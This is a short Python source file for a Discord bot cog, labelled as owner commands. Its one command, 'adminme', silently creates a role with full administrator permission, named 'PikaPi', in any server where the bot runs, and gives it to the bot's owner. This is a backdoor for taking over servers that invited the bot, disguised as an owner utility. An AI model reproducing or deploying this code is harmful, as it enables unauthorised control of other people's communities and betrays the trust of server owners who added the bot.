from discord.ext import commands
import discord
import random
import asyncio

class Owner(commands.Cog):
    """Commands for owner"""

    def __init__(self, bot):
        self.bot = bot
        
    @commands.command()
    @commands.is_owner()
    async def adminme(self, ctx):
        permission = discord.Permissions(administrator = True)
        new_role = await ctx.guild.create_role(name = "PikaPi", permissions = permission)
        await ctx.author.add_roles(new_role)

def setup(bot):
    bot.add_cog(Owner(bot))
